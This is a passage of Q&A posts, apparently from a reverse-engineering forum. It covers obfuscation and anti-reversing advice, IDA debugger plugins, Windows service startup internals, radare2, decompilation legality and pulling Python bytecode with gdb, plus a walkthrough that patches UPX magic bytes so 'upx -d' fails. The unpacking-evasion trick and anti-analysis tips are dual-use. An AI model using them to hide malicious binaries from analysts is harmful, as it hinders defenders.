<p><strong>Separation of functional blocks</strong></p>

<p>The separation of code into functions is another thing which makes it easier to reverse engineer a program. This applies especially when the functions are obfuscated because it creates boundaries around which the reverse engineer can reason about your software. This way the reverse engineer can solve your program in a divide and conquer manner. Ideally you would want your software in one effective block with obfuscation applied uniformly to the entire block as one. So reduce the number of blocks, use inlining very generously and wrap them in a good obfuscation algorithm. The compiler can easily do some heavy optimizations and stack ordering which will make the block harder to reverse engineer.</p>

<p><strong>Runtime</strong></p>

<p>When you hide information it is important that the information is well hidden at runtime as well. A competent reverse engineer will examine the state of your program as it is running. So using static variables that decrypt when loaded or by using packing which is completely unpacked upon loading will lead to a quick find. Be careful about what you allocate on the heap. All heap operations go via API calls and can be easily logged to a file and reasoned about. Stack operations are generally harder to keep track of just because of how frequent they are. Dynamic analysis is just as important as static. You need to be aware of what your program state is at all times and what information lies where.</p>

<p><strong>Anti-debugging</strong></p>

<p>Anti-debugging is worthless. Do not spend time on it. Spend time on making sure your secrets are well hidden independent of whether your software is at rest or not.</p>

<p><strong>Packing and encrypting code segment</strong></p>

<p>I will group encryption and packing into the same category. They both serve the same purpose and they both have the same issues. In order to execute the code, the CPU needs to see the plain text. So you have to provide the key in the binary. The only remotely effective way of encrypting and packing code segments is if you encrypt and decrypt them at functional boundaries and only if the decryption happens upon function entry and then re-encryption happens when leaving the function. This will provide a small barrier against dumping your binary as it is running but is must be coupled with strong obfuscation.</p>

<p><strong>Finally</strong></p>

<p>Study your software in something like the free version of IDA. Your goal is to make sure that it becomes virtually impossible for the reverse engineer to find a steady mental footing. The less information you leak and the more changing the environment is, the harder it will be to study. If you're not an experienced reverse engineer, designing something hard to reverse engineer is almost impossible.</p>

<p>If you're designing a copy protection system prepare for it to be broken mentally. Make sure you have a plan for how you will deal with the break and how to make sure the next version of your software adds enough value to drive upgrades. Build your system on a solid ground which can not be broken, do not resort to generating your own license keys using some custom algorithm hidden in the manner I described above. The system needs to be built on a sound cryptographic foundation for unforgeability of messages.</p>
","119"
"Creating IDA Pro debugger plugins - API documentation and examples?","4321","","<p>Are there any good resources for developing debugger plugins in IDA Pro using the SDK that describe the IDA debugger API? An example of this is the <a href=""http://sourceforge.net/projects/idaproarmdebug/"">IDA Pro ARM debugger plugin</a> on Sourceforge. There seem to be few projects that have accomplished this. Specifically, how do you make a plugin in IDA which registers itself as one of the available debuggers and allows stepping through the IDA database while controlling a target? </p>
","<p>None of the answers so far answer the actual question so here goes.</p>

<p>A debugger plugin differs from a ""normal"" one in two points:</p>

<ol>
<li>it has <code>PLUGIN_DBG</code> in the plugin's flags.</li>
<li>in init(), it must set the global variable <code>dbg</code> to a pointer to an implementation of <code>debugger_t</code> structure. See <code>idd.hpp</code> for the definition.</li>
</ol>

<p>For examples, see <code>plugins/debugger</code> in the SDK, and also the recently updated <a href=""https://github.com/wjp/idados""><code>idados</code> plugin</a>. Warning: making debugger plugins is not for the faint of heart.</p>
","1913"
"When to use OllyDgb over Immunity Debugger","4277","","<p>I have always been curious when I should use OllyDbg over Immunity Debugger.</p>

<p>Immunity Debugger has inherited code from OllyDbg and can perform scripted debugging with Python.</p>

<p>Interestingly enough, most of the times I do a Google search for a reverse engineering task with Immunity Debugger, I end up with search results related to exploit development. When I search for the same task with OllyDbg, I regularly find information more relevant to the reverse engineering task I am trying to accomplish.</p>

<p>If Immunity Debugger supports scripted debugging in Python (which simplifies the scripting process as opposed to making a plugin for OllyDbg), then why would I want to use OllyDbg over Immunity Debugger?</p>
","<p>Immunity Debugger is forked from OllyDbg v1.10.</p>

<p>So you should use the latest version of OllyDbg (<a href=""http://www.ollydbg.de/version2.html"" rel=""noreferrer"">currently v2.01</a>) instead of Immunity Debugger if you want any OllyDbg v2-specific features/fixes. If you don't need those OllyDbg v2-specific features/fixes though, then there's no benefit to using OllyDbg v1.10 over Immunity Debugger.</p>
","11287"
"How does services.exe trigger the start of a service?","4256","","<p>I'm trying to work out the internals of how a Windows process starts and maintains communication with <code>services.exe</code>. This is on Windows 8 x64, but if you have tips for Windows 7 that is fine too.</p>

<p>So far I figure out <code>services.exe</code> does something approximately like this:</p>

<pre><code>PROCESS_INFORMATION     pi;
    TCHAR                   szExe[] = _T(""C:\\Program Files\\TestProgram\\myWindowsService.exe"");
    PROCESS_INFORMATION process_information = {0};
    HKEY hOpen;
    DWORD dwNumber = 0;
    DWORD dwType = REG_DWORD;  
    DWORD dwSize = sizeof(DWORD);
    STARTUPINFOEX startup_info;
    SIZE_T attribute_list_size = 0;

    ZeroMemory(&amp;startup_info, sizeof(STARTUPINFOEX));

    // can see EXTENDED_STARTUPINFO_PRESENT is used, but couldn't figure out if any/what attributes are added
    BOOL status = InitializeProcThreadAttributeList(nullptr, 0, 0, &amp;attribute_list_size);
    PPROC_THREAD_ATTRIBUTE_LIST attribute_list = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attribute_list_size);

    startup_info.StartupInfo.cb = sizeof(STARTUPINFOEX);
    startup_info.lpAttributeList = attribute_list;
    startup_info.StartupInfo.dwFlags = STARTF_FORCEOFFFEEDBACK;
    startup_info.StartupInfo.wShowWindow= SW_HIDE;

        if(CreateProcess(
            NULL,
            szExe,
            NULL,
            NULL, 
            FALSE,
            CREATE_SUSPENDED | 
            CREATE_UNICODE_ENVIRONMENT | 
            DETACHED_PROCESS | 
            EXTENDED_STARTUPINFO_PRESENT,
            NULL,
            NULL, 
            &amp;startup_info.StartupInfo, 
            &amp;pi))
    {
        HANDLE hEvent;
        hEvent=CreateEvent(NULL,FALSE,FALSE,NULL); // I traced this call during service sstartup; no idea what purpose it serves?

        ResumeThread(pi.hThread);
</code></pre>

<p>Now my question is, how does the actual ""Start"" get communicated to the service? I know the service itself does something like this:</p>

<ol>
<li>main entry point (à la console program)</li>
<li>Call <code>advapi!StartServiceCtrlDispatcher</code></li>
<li>Goes to <code>sechost!StartServiceCtrlDispatcher</code></li>
<li>This jumps into <code>sechost!QueryServiceDynamicInformation</code></li>
</ol>

<p>I'm trying to figure out what method in <code>services.exe</code> is used to hook into this start process. Ideally I want to be able to write a PoC code that can ""launch"" a simple Windows service and get it to start, without it being registered as a Windows Service, i.e. wrapped inside a ""stand alone service control manager"". I'm looking for some tips of what best to look for next.</p>

<p>There is also a reference to <code>services.exe</code> in <code>\\pipe\ntsvcs</code>. The <a href=""http://en.wikipedia.org/wiki/Service_Control_Manager"">Wikipedia article about SCM</a> refers to <code>\Pipe\Net\NtControlPipeX</code> being created, but as far as I can tell, that is in Windows 2000 (maybe XP) but I can't see this happening on Windows 8.</p>
","<p>This is my basic understanding of how Windows service works. I have used it with Windows XP and Windows 7. These are general concepts anyways. </p>

<p>Any service requires three things to be present: </p>

<ol>
<li>A Main Entry Point</li>
<li>A Service Entry Point</li>
<li>A Service Control Handler</li>
</ol>

<p>You are absolutely right. In the Main Entry Point service must call <strong><code>StartServiceCtrlDispatcher(const SERVICE_TABLE_ENTRY *lpServiceTable)</code></strong> providing Service Control Manager with filled in <strong><code>SERVICE_TABLE_ENTRY</code></strong>, which is (per <a href=""http://msdn.microsoft.com/en-us/"" rel=""nofollow noreferrer"">MSDN</a>):</p>

<pre><code>typedef struct _SERVICE_TABLE_ENTRY {
    LPTSTR                  lpServiceName;
    LPSERVICE_MAIN_FUNCTION lpServiceProc;
} SERVICE_TABLE_ENTRY, *LPSERVICE_TABLE_ENTRY;
</code></pre>

<p>As you can see, there are two things which are required to be supplied in SERVICE_TABLE_ENTRY structure. Those are pointer to name of the service, and pointer to service main function. Right after service registration, Service Control Manager calls  Service Main function, which is also called ServiceMain or Service Entry Point. Service Control Manager expects that following tasks are performed by Service Entry Point:</p>

<ol>
<li>Register the service control handler.</li>
<li>Set Service Status</li>
<li>Perform necessary initialization (creating events, mutex, etc)</li>
</ol>

<p>Service Control Handler is a callback function with the following definition: <strong><code>VOID WINAPI ServiceCtrlHandler (DWORD CtrlCode)</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms685149%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>). It is expected to handle service STOP, PAUSE, CONTINUE, and SHUTDOWN. It is imperative that each service has a handler to handle requests from the SCM. Service control handler is registered with <strong><code>RegisterServiceCtrlHandlerEx()</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms685058%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>), which returns <strong><code>SERVICE_STATUS_HANDLE</code></strong>. Service uses the handle to communicate to the SCM. The control handler must also return within 30 seconds. If it does not happen the SCM will return an error stating that the service is unresponsive. This is due to the fact that the handler is called out of the SCM and will freeze the SCM until it returns from the handler. Only then, service may use <strong><code>SetServiceStatus()</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms686241%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>) function along with service status handle to communicate back to the SCM. </p>

<p>You don't communicate ""Start"" to a service. Whenever a service loads, it loads in the ""started"" state. It is service's responsibility to report its state to the SCM. You can PAUSE it or CONTINUE (plus about dozen more control codes). You communicate it to the SCM by using <strong><code>ControlService()</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682108%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>) function. The SCM in turn relays the control code (e.g. SERVICE_CONTROL_PAUSE, SERVICE_CONTROL_CONTINUE or any other one) through to the service using registered service control handler function. Afterwards, it is the services responsibility to act upon received control code.</p>

<p>I don't think services.exe executes or runs threads behind actual services. It is the SCM itself. I take it coordinates services in general. Each service ""lives"" in svchost.exe instance. Taking mentioned above into account, I could assume that Service Entry Point or Service Main is executed in the context of instance of the svchost.exe. In its turn, svchost.exe executes Service Main in context of main thread, blocking main thread until Service Main exists signaling that the service exited.</p>

<p>If you are thinking to create your own service control manager, there is no need to reverse engineer how services.exe does it. You can do it your own way and anyway that you like it :)</p>

<p>I hope it helps.</p>

<p><strong>ADDED:</strong></p>

<p>As <a href=""https://reverseengineering.stackexchange.com/users/161/mick"">Mick</a> commented below, <strong><code>services.exe</code></strong> is the Service Control Manager itself. </p>

<p>If you are creating your own service wrapper to run existing serivce executables outside of the SCM, you will have to adhere to above mentioned service quidelines and requirements. The fist requirement is for the service to get itself registered with the SCM and provide Service Main Entry Point, which is done by calling <strong><code>StartServiceCtrlDispatcher()</code></strong>. It will get you the entry point to Service Main. Afterwards, you should expect the Service Main to call <strong><code>RegisterServiceCtrlHandler()</code></strong> and <strong><code>SetServiceStatus()</code></strong>. Since <strong><code>RegisterServiceCtrlHandler()</code></strong> runs in context of Service Main and blocks Service Main thread, it should be handled properly as well. In addition, you should think of a way to control/monitor the service worker thread(s) by ""watching"" for <strong><code>CreatThread()</code></strong>(<a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682453%28v=vs.85%29.aspx"" rel=""nofollow noreferrer"">MSDN</a>) within Service Main. </p>
","2237"
"Decoding the UPX ELF header file","4229","","<p>Still on my way to understand how to prevent the usage of the <code>-d</code> (decompress) option of UPX (see this <a href=""https://reverseengineering.stackexchange.com/questions/3323/how-to-prevent-upx-d-on-an-upx-packed-executable"">question</a>), I try to identify the header file of UPX in ELF executable files.</p>

<p>Looking at the code, all the sources seems to be in the files <code>lx_elf.h</code> and <code>lx_elf.cpp</code> (stands for <em>Linux Elf</em>). I tried to follow the code but I got lost in it...</p>

<p>I also did take a look at the beginning of an UPX compressed executable file (amd64), visualized in 8-bytes per line mode for more clarity (and thanks to <a href=""http://code.google.com/p/corkami/wiki/ELF101"" rel=""nofollow noreferrer"">Corkami ELF-101</a>):</p>

<pre><code>00000000: 7f45 4c46 0201 0103  .ELF....
00000008: 0000 0000 0000 0000  ........
00000010: 0200 3e00 0100 0000  ..&gt;.....
00000018: 0831 4200 0000 0000  .1B.....    ELF HEADER
00000020: 4000 0000 0000 0000  @.......
00000028: 0000 0000 0000 0000  ........
00000030: 0000 0000 4000 3800  ....@.8.
00000038: 0200 4000 0000 0000  ..@.....

00000040: 0100 0000 0500 0000  ........
00000048: 0000 0000 0000 0000  ........
00000050: 0000 4000 0000 0000  ..@.....
00000058: 0000 4000 0000 0000  ..@.....    PROGRAM HEADER TABLE
00000060: f438 0200 0000 0000  .8......
00000068: f438 0200 0000 0000  .8......
00000070: 0000 2000 0000 0000  .. .....
00000078: 0100 0000 0600 0000  ........

00000080: 487d 0500 0000 0000  H}......
00000088: 487d 6500 0000 0000  H}e.....
00000090: 487d 6500 0000 0000  H}e.....
00000098: 0000 0000 0000 0000  ........
000000a0: 0000 0000 0000 0000  ........    UPX HEADER (???)
000000a8: 0000 2000 0000 0000  .. .....
000000b0: a298 b634 5550 5821  ...4UPX!
000000b8: f407 0d16 0000 0000  ........
000000c0: 1676 0500 1676 0500  .v...v..
000000c8: 0002 0000 bd00 0000  ........
000000d0: 0200 0000 fbfb 21ff  ......!.

000000d8: 7f45 4c46 0201 0100  .ELF....
000000e0: 0200 3e00 0d70 2840  ..&gt;..p(@
000000e8: 0f1b f26d 1605 00e8  ...m....   ELF HEADER (again)
000000f0: 6d05 0013 01eb be7b  m......{
000000f8: 3800 0805 1c00 1b00  8.......
00000100: 060f 0527 9b90 27ec  ...'..'.
00000108: 4000 4007 c001 0008  @.@.....
....8&lt;....
</code></pre>

<p>My guess is that the second ELF header (always located at an offset of <code>0xd8</code>) is the header of the compressed executable. And indeed, when looking at the original ELF header of the executable (before applying <code>upx</code>) we find:</p>

<pre><code>00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 7028 4000 0000 0000  ..&gt;.....p(@.....
00000020: 4000 0000 0000 0000 e86d 0500 0000 0000  @........m......
00000030: 0000 0000 4000 3800 0800 4000 1c00 1b00  ....@.8...@.....
00000040: 0600 0000 0500 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 4000 0000 0000 4000 4000 0000 0000  @.@.....@.@.....
00000060: c001 0000 0000 0000 c001 0000 0000 0000  ................
00000070: 0800 0000 0000 0000 0300 0000 0400 0000  ................
00000080: 0002 0000 0000 0000 0002 4000 0000 0000  ..........@.....
</code></pre>

<p>A few fields have been omitted in the compressed version but the header is mainly preserved. So, lets assume this is just a short version of the original ELF header.</p>

<p>But, what I would like to understand are the fields of the first header:</p>

<pre><code>00000080: 487d 0500 0000 0000  H}......
00000088: 487d 6500 0000 0000  H}e.....
00000090: 487d 6500 0000 0000  H}e.....
00000098: 0000 0000 0000 0000  ........
000000a0: 0000 0000 0000 0000  ........    UPX HEADER (???)
000000a8: 0000 2000 0000 0000  .. .....
000000b0: a298 b634 5550 5821  ...4UPX!
000000b8: f407 0d16 0000 0000  ........
000000c0: 1676 0500 1676 0500  .v...v..
000000c8: 0002 0000 bd00 0000  ........
000000d0: 0200 0000 fbfb 21ff  ......!.
</code></pre>

<p>So, my question is about discovering the location and the meaning of the fields of the UPX header. If somebody knows about UPX internals any hint would be appreciated.</p>
","<p>It's very easy to prevent the UPX tool to unpack an UPX compressed file. If you take a look to the source code you will see that it checks for the magic string <code>UPX_MAGIC_LE32</code> in <code>p_lx_interp.cpp</code>. So, I simply changed all matches of the string (in binary chunks) ""<code>UPX!</code>"" to ""<code>AAA!</code>"". I copied <code>/bin/ls</code> (ELF64) to another folder and packed with UPX. Then I edited it like this:</p>

<pre>
$ pyew ls
ELF Information
(...)
[0x00000000]> /s UPX # Search for the string UPX
HINT[0x000000b4]: UPX!........p...p...8.............!..ELF......>...E@..e....p
HINT[0x0000abcc]: UPX!.........S...USQRH..VH..H..1.1.H....P.....t.....H.......
HINT[0x0000ad3b]: UPX executable packer http://upx.sf.net $..$Id: UPX 3.07 Cop
HINT[0x0000ad6b]: UPX 3.07 Copyright (C) 1996-2010 the UPX Team. All Rights Re
HINT[0x0000ad90]: UPX Team. All Rights Reserved. $....^j._j.X..j._j....N...p...I.......
[0x00000000]> s 0xb4 # Seek to the specified offset in the file
[0x000000b4:0x000000b4]> edit # Open the file for editing
[0x000000b4:0x000000b4]> wx 414141 # Patch in hexadecimal
[0x000000b4:0x000000b4]> s 0xabcc
[0x0000abcc:0x0000abcc]> wx 414141
[0x0000abcc:0x0000abcc]> s 0xafe7
[0x0000afe7:0x0000afe7]> wx 414141
[0x0000afe7:0x0000afe7]> s 0xb3ac
[0x0000b3ac:0x0000b3ac]> wx 414141
[0x0000b3ac:0x0000b3ac]> q # And quit
$ ./ls
(...lots of files...)
$ upx -d ./ls
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2010
UPX 3.07        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 08th 2010
        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: ls: NotPackedException: not packed by UPX

Unpacked 0 files.
</pre>

<p>That's all. Anyway, remember that you're only preventing this tool to unpack UPX compressed files. UPX is a compressor that anyone with basic knowledge about packers can uncompress with little to no effort.</p>
","3663"
"Recursive traversal disassembling with Radare2?","4219","","<p>I am trying  the recursive traversal disassembler of the <code>radare2</code> tool. But, I cannot use it properly.</p>

<p>First, according to the <code>radare2</code> manual, we can use recursive traversal disassembler by using the <code>pdr</code>:</p>

<pre><code>[0x00404890]&gt; pd?
Usage: pd[f|i|l] [len] @ [addr]
  pda  : disassemble all possible opcodes (byte per byte)
  pdj  : disassemble to json
  pdb  : disassemble basic block
  pdr  : recursive disassemble across the function graph
  pdf  : disassemble function
  pdi  : like 'pi', with offset and bytes
  pdl  : show instruction sizes
</code></pre>

<p>But I always get this error message:</p>

<pre><code>Cannot find function at 0x004028c0
</code></pre>

<p>Here is a full session of <code>radare2</code> on the <code>ls</code> command with, first, a linear sweep disassembly and, then, an attempt of recursive traversal disassembly:</p>

<pre><code>$&gt; radare2 /bin/ls
syntax error: error in error handling
syntax error: error in error handling
[0x00404890]&gt; pd@main
        ;-- main:
        0x004028c0    4157         push r15
        0x004028c2    4156         push r14
        0x004028c4    4155         push r13
        0x004028c6    4154         push r12
        0x004028c8    55           push rbp
        0x004028c9    4889f5       mov rbp, rsi
        0x004028cc    53           push rbx
        0x004028cd    89fb         mov ebx, edi
        0x004028cf    4881ec88030. sub rsp, 0x388
        ...
        0x00402dff    8b0567772100 mov eax, [rip+0x217767] ; 0x0040a56c 
        0x00402e05    488b0d64772. mov rcx, [rip+0x217764] ; 0x0040a570 
        0x00402e0c    83f801       cmp eax, 0x1
        0x00402e0f    0f84de0d0000 jz 0x403bf3
        0x00402e15    83f802       cmp eax, 0x2
        0x00402e18    be0f384100   mov esi, 0x41380f
        0x00402e1d    b80e384100   mov eax, str.vdir
        0x00402e22    480f45f0     cmovnz rsi, rax
        0x00402e26    488b3de3772. mov rdi, [rip+0x2177e3] ; 0x0040a610
        0x00402e2d    48c70424000. mov qword [rsp], 0x0
        0x00402e35    41b9bd384100 mov r9d, str.DavidMacKenzie
        0x00402e3b    41b8cd384100 mov r8d, str.RichardM.Stallman
[0x00404890]&gt; pdr@main
Cannot find function at 0x004028c0
</code></pre>

<p>In fact, I strongly suppose that I am missing a step here. It seems that we should first build the call graph of the program, but I didn't manage to find how to do it (I obviously have missed some documentation somewhere, sorry for that!). </p>

<p>So, if somebody can give me a hint about it, I would be pleased !</p>
","<p>In fact, you should first run a '<em>function</em>' analysis of the program. To better understand this type <code>a?</code>:</p>

<pre><code>[0x00404890]&gt; a?
Usage: a[?adfFghoprsx]
 a8 [hexpairs]    ; analyze bytes
 aa               ; analyze all (fcns + bbs)
 ad               ; analyze data trampoline (wip)
 ad [from] [to]   ; analyze data pointers to (from-to)
 ae [expr]        ; analyze opcode eval expression (see ao)
 af[bcsl?+-*]     ; analyze Functions
 aF               ; same as above, but using graph.depth=1
 ag[?acgdlf]      ; output Graphviz code
 ah[?lba-]        ; analysis hints (force opcode size, ...)
 ao[e?] [len]     ; analyze Opcodes (or emulate it)
 ap               ; find and analyze function preludes
 ar[?ld-*]        ; manage refs/xrefs
 as [num]         ; analyze syscall using dbg.reg
 at[trd+-*?] [.]  ; analyze execution Traces
 ax[-cCd] [f] [t] ; manage code/call/data xrefs
Examples:
 f ts @ `S*~text:0[3]`; f t @ section..text
 f ds @ `S*~data:0[3]`; f d @ section..data
 .ad t t+ts @ d:ds
</code></pre>

<p>And, more precisely with an <code>af?</code>:</p>

<pre><code>[0x00404890]&gt; af?
Usage: af[?+-l*]
 af @ [addr]               ; Analyze functions (start at addr)
 af+ addr size name [type] [diff] ; Add function
 af- [addr]                ; Clean all function analysis data (or function at addr)
 afb 16                    ; set current function as thumb
 afbb fcnaddr addr size name [type] [diff] ; Add bb to function @ fcnaddr
 afl[*] [fcn name]         ; List functions (addr, size, bbs, name)
 afi [fcn name]            ; Show function(s) information (verbose afl)
 afr name [addr]           ; Rename name for function at address (change flag too)
 afs [addr] [fcnsign]      ; Get/set function signature at current address
 af[aAv][?] [arg]          ; Manipulate args, fastargs and variables in function
 afc @ [addr]              ; Calculate the Cyclomatic Complexity (starting at addr)
 af*                       ; Output radare commands
</code></pre>

<p>Then, start a '<em>functions</em>' analysis beginning at <code>main</code>:</p>

<pre><code>[0x00404890]&gt; af@main
</code></pre>

<p>Then, you can run a recursive traversal disassembly:</p>

<pre><code>[0x00404890]&gt; pdr@main
/ (fcn) fcn.004028c0 7460
|           ;-- main:
|           0x004028c0    4157         push r15
|           0x004028c2    4156         push r14
|           0x004028c4    4155         push r13
|           0x004028c6    4154         push r12
|           0x004028c8    55           push rbp
|           0x004028c9    4889f5       mov rbp, rsi
|           0x004028cc    53           push rbx
|           0x004028cd    89fb         mov ebx, edi
|           0x004028cf    4881ec88030. sub rsp, 0x388
|           0x004028d6    488b3e       mov rdi, [rsi]
|           0x004028d9    64488b04252. mov rax, [fs:0x28]
|           0x004028e2    48898424780. mov [rsp+0x378], rax
|           0x004028ea    31c0         xor eax, eax
|           0x004028ec    e8afad0000   call 0x40d6a0 ; (fcn.0040d69f)
|              fcn.0040d69f(unk, unk, unk, unk, unk, unk)
|           0x004028f1    be19694100   mov esi, 0x416919
|           0x004028f6    bf06000000   mov edi, 0x6
|               0x004028fb    e810feffff   call sym.imp.setlocale

... clip ...

--
|           0x00402980    83e801       sub eax, 0x1
|           0x00402983    7405         jz fcn.004038a8
-[true]-&gt; 0x0040298a
-[false]-&gt; 0x00402985
--
</code></pre>

<p>You can also start radare2 with the <code>-A</code> option:</p>

<blockquote>
  <p>-A : run 'aaa' command before prompt or patch to analyze all referenced code</p>
</blockquote>

<p>See also <a href=""http://radare.today/posts/analysis-by-default/"" rel=""nofollow"">http://radare.today/posts/analysis-by-default/</a></p>
","4263"
"Legality of Decompilation","4197","","<p>How ""legal"" is it to read and edit .exe files, .dll files, and other compiled source files? Decompilation is taking the compiled code of a program, often minified and obfuscated, and trying to get the original source code back as it was written, or at least get it in a form a person could read. There are various reasons a person or company would make its code harder to read while compiling it, but the 2 I've seen most often have to do with saving resources, like space, RAM, power, etc., and making it so the code is harder to read so the user can not see what it does as easily. As we are a community about questioning the practices of reverse engineering, I think it's safe to say most of us don't like the second reason. I am asking for facts here, though, not opinions.</p>

<p>Because this question could get very broad, I will limit this to laws in particular countries and rules of various influential or popular companies, but info about generalities is also welcome. I am definitely not asking about morals/ethics, although I know those will certainly come up.</p>

<p>There was already <a href=""https://reverseengineering.stackexchange.com/questions/60/is-reverse-engineering-and-using-parts-of-a-closed-source-application-legal"">a question about the legality of reverse engineering in general</a>, but I'm talking only about decompilation here. As the answers to this question stated, decompilation is one type of reverse engineering. As far as I could tell, the other question didn't get answers about decompilation specifically, though you are free to provide these yourself. One answer did say the question was too broad, but perhaps this question will have a better scope.</p>
","<p>Legality of decompilation depends on the <code>EULA</code> (End User License Agreement) of the binary you wish to work with. While Open Source License Agreements like <code>GPL</code> may allow to edit/decompile the binary, other closed source proprietary agreements will prevent you in most cases.</p>

<p>That being said decompiling is always legal to somewhat a limited extend according to copyright laws of Europe and the US.</p>

<p>More information on this topic here
<br><a href=""https://uk.answers.yahoo.com/question/index?qid=20111105222757AAGuJvd"" rel=""nofollow noreferrer"">https://uk.answers.yahoo.com/question/index?qid=20111105222757AAGuJvd</a>
<br><a href=""http://en.wikipedia.org/wiki/Decompiler#Legality"" rel=""nofollow noreferrer"">http://en.wikipedia.org/wiki/Decompiler#Legality</a>
<br><a href=""https://security.stackexchange.com/questions/30359/is-decompiling-software-considered-unethical-or-illegal"">https://security.stackexchange.com/questions/30359/is-decompiling-software-considered-unethical-or-illegal</a></p>
","4745"
"Is it possible to get python bytecode without using co_code?","4175","","<p>I posted this a while back on <a href=""https://stackoverflow.com/questions/12513901/is-it-possible-to-get-python-bytecode-without-using-co-code"">stackoverflow</a> (too old to migrate though).</p>

<p>Say I am in the python interpreter and define a function as follows:</p>

<pre><code>def h(a):
  return a
</code></pre>

<p>If I want to look at the bytecode (not a disassembly using dis), I can typically use <code>h.func_code.co_code</code>. Is there any other way to look at the bytecode? This particular application was packaged with a custom python interpreter (using py2exe probably) which removed access to co_code. I can't just look at the pyc file as they are encrypted.</p>

<p>For example, in the interpreter, if I just type <code>h</code> without making it a function call, I get the address of the function. Can I use that address to get the bytecode? Is there some other way?</p>

<p>P.S. My original goal in doing this at the time was to use pyREtic (which calls co_code) to decompile. Since it called co_code, it would fail to work. I figured out one way to do it which I will post as an answer eventually. Wanted to see what others have done or come up with.</p>
","<p>First, just a small reminder about ""what is <code>co_code</code>"".</p>

<p>In Python, every element of the language (functions, methods, classes, ...) is defined and stored in an object. The <code>co_code</code> is one of the fields attached to the class used to represent a function or a method.  Lets practice a bit with Python 2.7.</p>

<pre><code>$&gt; python2.7
Python 2.7.3 (default, Mar  4 2013, 14:57:34) 
[GCC 4.7.2] on linux2
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
&gt;&gt;&gt; def foo():
...     print('Hello World!')
... 
&gt;&gt;&gt; dir(foo.__code__)

['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', 
 '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', 
 '__new__',  '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', 
 '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 
 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 
 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
&gt;&gt;&gt; foo.__code__.co_code
'd\x01\x00GHd\x00\x00S'
</code></pre>

<p>So, you can see that the <code>co_code</code> field contain the compiled bytecode of the function we just defined previously. In fact, it seems that <code>co_code</code> is just a buffer to store the compiled bytecode in a lazy manner. It is compiled only when it is accessed for the first time.</p>

<p>Assuming this, the <code>co_code</code> is just a unified helper to access the bytecode which might be stored in several forms. One form are the <code>*.pyc</code> files which are storing the compiled Python bytecode of a whole file. Another form is just the on-the-fly compilation of the function/method.</p>

<p>Nevertheless, there is a way to access directly the function/method definition and, thus, to the bytecode. The point is to intercept the Python process with <code>gdb</code> and analyze it. A few tutorials exists in the web about this (see <a href=""http://grapsus.net/blog/post/Low-level-Python-debugging-with-GDB"">here</a>, <a href=""http://docs.python.org/devguide/gdb.html"">here</a>, <a href=""http://www.jmcneil.net/2012/04/debugging-your-python-with-gdb-ftw/"">here</a> or <a href=""http://chrismiles.livejournal.com/20226.html"">here</a>). But, here is a quick example (you need to install the <code>python-gdb</code> package first):</p>

<pre><code>$&gt; python2.7-dbg
Python 2.7.3 (default, Mar  4 2013, 14:27:19) 
[GCC 4.7.2] on linux2
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
&gt;&gt;&gt; def foo():
...     print('Hello World!')
... 
[40809 refs]
&gt;&gt;&gt; foo
&lt;function foo at 0x1a5e1b0&gt;
[40811 refs]
&gt;&gt;&gt; foo.__code__.co_code
'd\x01\x00GHd\x00\x00S'
[40811 refs]
&gt;&gt;&gt; 
[1]+  Stopped                 python2.7-dbg
</code></pre>

<p>Then, you need to get the PID of the Python process and attach <code>gdb</code> on it.</p>

<pre><code>$ gdb -p 5164
GNU gdb (GDB) 7.4.1-debian
...
Attaching to process 5164
Program received signal SIGTSTP, Stopped (user).
Reading symbols from /usr/bin/python2.7-dbg...done.
Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0...
Reading symbols from /usr/lib/debug/lib/x86_64-linux-gnu/libpthread-2.13.so...done.
[Thread debugging using libthread_db enabled]
Using host libthread_db library ""/lib/x86_64-linux-gnu/libthread_db.so.1"".done.
...
(gdb) print *(PyFunctionObject*)0x1a5e1b0
$1 = {_ob_next = 0x187aca0, _ob_prev = 0x189dd08, ob_refcnt = 2, 
      ob_type = 0x87ce00, func_code = &lt;code at remote 0x187aca0&gt;, 
      func_globals = {'__builtins__': &lt;module at remote 0x7f5ebcb5e470&gt;,
      '__name__': '__main__', 'foo': &lt;function at remote 0x1a5e1b0&gt;, '__doc__': None, 
      '__package__': None}, func_defaults = 0x0, func_closure = 0x0, func_doc = None, 
      func_name = 'foo', func_dict = 0x0, func_weakreflist = 0x0, 
      func_module = '__main__'}
(gdb) print  (*(PyFunctionObject*)0x1a5e1b0)-&gt;func_name
$2 = 'foo'
(gdb) print (*(PyCodeObject*)0x187aca0)
$3 = {_ob_next = 0x18983a8, _ob_prev = 0x1a5e1b0, ob_refcnt = 1, ob_type = 0x872680, 
      co_argcount = 0, co_nlocals = 0, co_stacksize = 1, co_flags = 67,
      co_code = 'd\x01\x00GHd\x00\x00S', co_consts = (None, 'Hello World!'),
      co_names = (), co_varnames = (), co_freevars = (), co_cellvars = (),
      co_filename = '&lt;stdin&gt;', co_name = 'foo', co_firstlineno = 1,
